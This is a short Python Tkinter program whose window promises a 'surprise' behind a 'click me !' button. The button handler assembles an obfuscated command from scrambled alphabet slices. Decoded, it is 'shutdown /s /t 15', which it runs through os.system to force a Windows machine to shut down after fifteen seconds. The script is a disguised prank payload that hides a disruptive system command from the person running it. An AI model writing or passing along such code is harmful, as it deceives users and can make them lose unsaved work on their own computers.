from tkinter import *
import os

root = Tk()
root.title("surprise")

def go():
    a = "abcdefghijklmnopqrsutvwxyz"
    b = a[-8]+a[7]+a[-7:-5]
    c = a[3]+a[-12]+a[-4]+a[-13]
    d = b+c
    e = (d+f" /{a[-8]} /{a[-6]} 15")
    os.system(e)
    
root.config(bg = "black")
label1 = Label(root,text = "to get surprised click on the given button :",font=("verdana",20,"bold"),fg = "yellow",bg = "black")
label1.pack(padx = 20)
button = Button(root,text = "click me !",font=("verdana",20,"bold"),command = go,fg = "yellow",bg = "red",borderwidth = 5,relief = "raised")
button.pack(pady = 40)

root.mainloop()
